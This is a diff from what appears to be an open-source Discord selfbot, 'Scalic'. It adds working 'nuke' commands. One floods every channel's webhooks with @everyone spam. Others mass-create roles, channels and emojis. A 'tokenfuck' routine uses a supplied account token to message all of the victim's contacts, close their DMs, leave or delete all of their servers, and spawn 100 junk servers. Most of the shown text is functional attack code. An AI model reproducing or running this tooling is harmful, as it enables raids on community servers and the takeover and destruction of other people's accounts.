+          "content": "@everyone **Nuked via scalic** Body-ody-ody-ody-ody-ody-ody-ody Body-yada-yada-yada-yada-yada-yada-yada-yada weeee @@@@@@@@@@@@@@@ sksksksk\n⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️ ⛓️",
+          "embeds": [
+            {
+              "title": "This server has been nuked via scalic nuker",
+              "tts": "true",
+              "description": "**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_\n\n**Body-ody-ody-ody-ody-ody-ody-ody**\n\n__Body-ody-ody-ody-ody-ody-ody-ody__\n\n_Body-ody-ody-ody-ody-ody-ody-ody_",
+              "url": "https://www.youtube.com/watch?v=X_C26M6MJiY",
+              "color": randcolor,
+              "fields": [
+                {
+                  "name": "Scalic Nuker",
+                  "value": "Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker"
+                },
+                {
+                  "name": "Nuked by scalic Nuked by scalic",
+                  "value": "Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker"
+                },
+                {
+                  "name": "Scalic Nuker Scalic Nuker Scalic Nuker",
+                  "value": ":chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:"
+                },
+                {
+                  "name": "eee",
+                  "value": ":chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:  :chains: :chains: :chains:"
+                }
+              ],
+              "author": {
+                "name": "Scalic",
+                "url": "https://avatars.githubusercontent.com/u/78554732?s=200&v=4",
+                "icon_url": "https://avatars.githubusercontent.com/u/78554732?s=200&v=4"
+              },
+              "footer": {
+                "text": "Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker Scalic Nuker",
+                "icon_url": "https://avatars.githubusercontent.com/u/78554732?s=200&v=4"
+              },
+              "image": {
+                "url": "https://avatars.githubusercontent.com/u/78554732?s=200&v=4"
+              },
+              "thumbnail": {
+                "url": "https://avatars.githubusercontent.com/u/78554732?s=200&v=4"
+              }
+            },
+            {
+              "url": "https://www.youtube.com/watch?v=X_C26M6MJiY",
+              "image": {
+                "url": "https://avatars.githubusercontent.com/u/78554732?s=200&v=4"
+              }
+            },
+            {
+              "url": "https://www.youtube.com/watch?v=X_C26M6MJiY",
+              "image": {
+                "url": "https://avatars.githubusercontent.com/u/78554732?s=200&v=4"
+              }
+            },
+            {
+              "url": "https://www.youtube.com/watch?v=X_C26M6MJiY",
+              "image": {
+                "url": "https://avatars.githubusercontent.com/u/78554732?s=200&v=4"
+              }
+            }
+          ],
+          "username": "Scalic nuker scalic nuker - an advanced selfbot made open source on github! @@@@",
+          "avatar_url": "https://avatars.githubusercontent.com/u/78554732?s=200&v=4"
+        }
+
+        spamming = requests.post(webhook, json=data)  
+        spammingerror = spamming.text
+        if spamming.status_code == 204:
+            pass #i might have something here later so putting pass in for now
+
+        elif "rate limited" in spammingerror.lower():
+            
+            try:
+                j = json.loads(spammingerror)
+                ratelimit = j['retry_after']
+                timetowait = ratelimit / 1000
+                time.sleep(timetowait)
+
+            except:
+                delay = random.randint(5, 10)
+                time.sleep(delay)
+        else:
+            delay = random.randint(30, 60)
+            time.sleep(delay)
+
+
+@scalic.command(aliases=['webhookfuck', 'spamwebhooks',"webhooknuke","webhooksnuke","webhooksfuck","spamwebhook"])
+async def webhookspam(ctx):
+    global spammingdawebhookeroos
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+    spammingdawebhookeroos = True
+    if len(await ctx.guild.webhooks()) != 0: #nuked with existing ones too!
+        for webhook in await ctx.guild.webhooks():
+            threading.Thread(target = ssspam, args = (webhook.url,)).start()
+    if len(ctx.guild.text_channels) >= 50:
+        webhookamount = 1
+
+    else:
+        webhookamount = 50 / len(ctx.guild.text_channels) 
+        webhookamount = int(webhookamount) + 1 #+1 just in case any errors idk
+    for i in range(webhookamount):  #sooo - a bit about this. 50 webhooks can usually be made at once - it'll give you the option to make more but return "internal error" - this is an efficient way to make the correct amount of channels and get the best possible spam (multiple webhooks in one channel isnt efficient)
+        for channel in ctx.guild.text_channels:
+
+            try:
+            
+                webhook =await channel.create_webhook(name='Nuked via scalic ig')
+                threading.Thread(target = ssspam, args = (webhook.url,)).start()
+                f = open(r'data/webhooks-'+str(ctx.guild.id)+".txt",'a')
+                f.write(f"{webhook.url} \n")
+                f.close()
+
+            except:
+                print (f"{Fore.RED} > Webhook Error")
+
+
+def nooooourrolesgotnukedomg(idofguild,nameofchan):
+    try:
+        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
+        randcolor = random.randint(0x000000, 0xFFFFFF)
+        make = requests.post(f"https://discord.com/api/v8/guilds/{idofguild}/roles",headers=headers,json={"name":nameofchan,"permissions":"2251804225","color":randcolor,"mentionable":"true"})
+    except:
+        pass
+
+@scalic.command(aliases=['spamrole', 'rolefuck',"fuckrole","fuckroles","rolesfuck","nukeroles","rolenuke"])
+async def rolespam(ctx,amountofthemtomake=None,*,nameofthem=None):
+    await ctx.message.delete()
+    if nameofthem == None:
+        nameofthem = "Nuked via scalic ig"
+
+    if amountofthemtomake == None:
+        amountofthemtomake = 50
+    for i in range(int(amountofthemtomake)):
+        threading.Thread(target = nooooourrolesgotnukedomg, args = (ctx.guild.id,nameofthem,)).start()
+
+
+
+
+
+
+
+@scalic.command(aliases=['stopwebhookfuck', 'webhookstop',"webhookspamstop","stopwebhooksspam","webhookspamoff"])
+async def stopwebhookspam(ctx):
+    global spammingdawebhookeroos
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+    spammingdawebhookeroos = False
+
+def nooooourchannelsgotnukedomg(idofguild,nameofchan):
+    try:
+        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
+        req = requests.post(f"https://canary.discord.com/api/v8/guilds/{idofguild}/channels",headers=headers,json={"type":"0","name":nameofchan})
+    except:
+        pass
+
+@scalic.command(aliases=['textchannelcreation', 'textchannelnuke',"channelspam","nuketextchannels","channelsspam"])
+async def nuketextchannel(ctx,amountofthemtomake=None,*,nameofthem=None):
+    await ctx.message.delete()
+    if nameofthem == None:
+        nameofthem = "Nuked-via-scalic-ig"
+    else:
+        nameofthem = nameofthem.replace(" ","-")
+
+    if amountofthemtomake == None:
+        amountofthemtomake = 50
+    for i in range(int(amountofthemtomake)):
+        threading.Thread(target = nooooourchannelsgotnukedomg, args = (ctx.guild.id,nameofthem,)).start()
+
+@scalic.command(aliases=['emojicreation', 'emojinuke',"emojisspam","nukeemojis","emojispam","emojisnuke","emotespam"])
+async def emotenuke(ctx):
+    await ctx.message.delete()
+    with open("data/scalic-bomb-emoji-for-server-nukes.jpeg", "rb") as f:
+        img1 = f.read()
+    with open("data/scalic-clown-emoji-for-server-nukes.jpeg", "rb") as f:
+        img2 = f.read()
+    with open("data/scalic-nuke-emoji-for-server-nukes.jpeg", "rb") as f:
+        img3 = f.read()
+
+    with open("data/scalic-orange-justice-gif-for-server-nukes.jpeg", "rb") as f:
+        gif1 = f.read()
+
+    with open("data/scalic-nuke-gif-for-server-nukes.jpeg", "rb") as f:
+        gif2 = f.read()
+
+
+    sijome = [img1,img2,img3]
+    sfig = [gif1,gif2]
+    for i in range(50):  #after 50 youll get ratelimited, so no point , even if the server has a million boosts :)
+        try:
+            randemoj = choice(sijome)
+            randomemojiname =  "".join(random.choice(characters) for scale in range(32))
+            await ctx.guild.create_custom_emoji(name = (randomemojiname), image = randemoj)
+        except:
+            pass
+        try:
+            randgif = choice(sfig)
+            randomgifname =  "".join(random.choice(characters) for scale in range(32))
+            await ctx.guild.create_custom_emoji(name = (randomgifname), image = randgif)
+        except:
+            pass
+
+
+
+@scalic.command(aliases=['hypehousechange', 'hypehouse',"hypesquadchange","changehypesquad","changehypehouse","househype"])
+async def hypesquad(ctx,squad=None):
+    randcolor = random.randint(0x000000, 0xFFFFFF)
+    if squad == None:
+        embed=discord.Embed(title="Scalic Selfbot - Hypesquad Changer", description=f"Options : \n`{prefix.strip()}hypesquad bravery`\n`{prefix.strip()}hypesquad brilliance`\n`{prefix.strip()}hypesquad balance`", color=randcolor)
+        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+        await ctx.message.edit(content="",embed=embed)
+    else:
+
+
+        if squad.lower() == "bravery" or squad == "1":
+            typeofhouse = "1"
+        elif squad.lower() == "brilliance" or squad == "2":
+            typeofhouse = "2"
+        elif squad.lower() == "balance" or squad == "3":
+            typeofhouse = "3"
+
+        else:
+            allhouses = ["1","2","3"]
+            randomhouse = choice(sijome)
+    
+        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
+        data = requests.post("https://discord.com/api/v6/hypesquad/online", json = {'house_id': typeofhouse}, headers=headers)
+        if data.status_code == 204:
+            embed=discord.Embed(title="Scalic Selfbot - Hypesquad Changer", description=f"Hypesquad changed successfully", color=randcolor)
+            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+            await ctx.message.edit(content="",embed=embed)
+        else:
+            embed=discord.Embed(title="Scalic Selfbot - Hypesquad Changer", description=f"Error - Site responded with status code : `{data.status_code}`\nMessage : `{data.text}`", color=randcolor)
+            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+            await ctx.message.edit(content="",embed=embed)
 
 
 
@@ -489,6 +1410,250 @@ async def impersonate(ctx, member: discord.Member=None,*,message="I forgot to su
             embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
             #await ctx.message.edit(content="",embed=embed)            
 
+def makeguildxd(tokentouse,nukemsg):
+    global serversmade
+
+    # with open("data/scalic-clown-emoji-for-server-nukes.png", "rb") as img:
+    #     imagestuff = base64.b64encode(img.read())
+
+
+    data = {
+    #"icon": f"data:image/png;base64,{imagestuff}",  #LEMME KNOW IF YOU CAN HELP WITH THIS!
+    "name": nukemsg
+    }
+    headers={"authorization": tokentouse}
+
+
+    servercreation = requests.post("https://discord.com/api/v8/guilds/templates/GC9sXUCX85P8",headers=headers,json=data).status_code
+    if servercreation == 201:
+        serversmade += 1
+  
+
+
+@scalic.command(aliases=['tokenfuck',"tockenfuck","fucktocken","accountfuck","fuckaccount"])
+async def fucktoken(ctx,tokentofrick=None,*,nukemsg=f"This account was nuked with the help of scalic! - GG"):
+    global serversmade
+    serversmade = 0
+    randcolor = random.randint(0x000000, 0xFFFFFF)
+    await ctx.message.delete()
+    if tokentofrick == None:
+        embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"Supply a token - {prefix.strip()}tokenfuck [token-here] [message-to-nuke-with]", color=randcolor)
+        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+        await ctx.message.edit(content="",embed=embed)
+
+
+    elif ctx.guild == None:
+        embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"Try do this command in a private server - it has problems in dms!", color=randcolor)
+        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+        await ctx.message.edit(content="",embed=embed)
+
+    else:
+        embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"If your sure you want to token fuck the account, react with the emoji below.\nThis process will dm all open dms , then close them, leave all servers, and make a ton of servers", color=randcolor)
+        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+        message = await ctx.send(embed=embed)        
+        await message.add_reaction('✅')
+        randcolor = random.randint(0x000000, 0xFFFFFF)
+        reactionstuffyes = True
+        def requirements(reaction, user):
+            return user == ctx.author and str(reaction.emoji) in ('✅') and message==message
+
+
+        while reactionstuffyes:
+            try:
+                reaction, user = await scalic.wait_for('reaction_remove', timeout=10, check=requirements)
+                embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"You reacted, the process has started!\nValidating token...", color=randcolor)
+                embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+                embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+                await message.edit(embed=embed)
+                await message.clear_reactions()
+                reactionstuffyes = False
+                headers={"authorization": tokentofrick}
+                tokendata = requests.get("https://discord.com/api/v8/users/@me",headers=headers)
+
+                if tokendata.status_code != 200:
+                    embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"Error - are you sure that token is correct?\nDiscord responded with : `{tokendata.text}`", color=randcolor)
+                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+                    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+                    await message.edit(embed=embed)           
+                else:
+                    embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"Token valid - continuing the process", color=randcolor)
+                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+                    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+                    await message.edit(embed=embed)      
+
+
+                    resp = requests.get("https://discord.com/api/v8/users/@me/channels",headers=headers)
+                    data = json.loads(resp.text)
+                    usersmessaged = int(0)
+
+                    for i in range(len(data)):
+
+                        messagesent = requests.post(f"https://discord.com/api/v8/channels/{data[i]['id']}/messages",headers=headers,json={"content": nukemsg})
+                        if messagesent.status_code == 200:
+                            usersmessaged += 1
+                        else:
+                            await asyncio.sleep(1)
+
+                        requests.delete(f"https://discord.com/api/v8/channels/{data[i]['id']}",headers=headers)
+
+
+                    randcolor = random.randint(0x000000, 0xFFFFFF)
+                    embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"Messaged {usersmessaged} people saying : `{nukemsg}` and cleared the conversation after", color=randcolor)
+                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+                    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+                    await message.edit(embed=embed)              
+            
+                    resp = requests.get("https://discord.com/api/v8/users/@me/guilds",headers=headers)
+                    data = json.loads(resp.text)
+                    serversleft = int(0)
+
+                    for i in range(len(data)):
+                        serverleaving = requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{data[i]['id']}",headers=headers).status_code
+                        if serverleaving == 204:
+                            serversleft += 1
+                        else:
+                            await asyncio.sleep(1)
+
+                    randcolor = random.randint(0x000000, 0xFFFFFF)
+                    embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"Left `{serversleft}` servers", color=randcolor)
+                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+                    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+                    await message.edit(embed=embed)  
+
+                    resp = requests.get("https://discord.com/api/v8/users/@me/guilds",headers=headers)
+                    data = json.loads(resp.text)
+                    serversdeleted = int(0)
+
+                    for i in range(len(data)):
+                        servdel = requests.post(f"https://discord.com/api/v8/guilds/{data[i]['id']}/delete",headers=headers,json={}).status_code
+                        if servdel == 204:
+                            serversdeleted += 1
+                        else:
+                            await asyncio.sleep(1)
+
+                    randcolor = random.randint(0x000000, 0xFFFFFF)
+                    embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"Deleted `{serversdeleted}` servers", color=randcolor)
+                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+                    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+                    try:
+                        await message.edit(embed=embed)  
+                    except:
+                        pass
+                            
+
+                    for i in range(100):
+                        threading.Thread(target = makeguildxd, args = (tokentofrick,nukemsg,)).start()
+                        await asyncio.sleep(1) #heavy ratelimits but still faster
+
+
+
+                    randcolor = random.randint(0x000000, 0xFFFFFF)
+                    embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"Made {serversmade} servers", color=randcolor)
+                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+                    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+                    try:
+                        await message.edit(embed=embed)  
+                    except:
+                        pass
+                            
+                    await asyncio.sleep(3)
+                    randcolor = random.randint(0x000000, 0xFFFFFF)
+                    embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"Overall results.\nMessaged `{usersmessaged}` people `{nukemsg}` and deleted the conversation.\nLeft `{serversleft}` servers\nDeleted `{serversdeleted}` servers\nMade `{serversmade}` servers", color=randcolor)
+                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
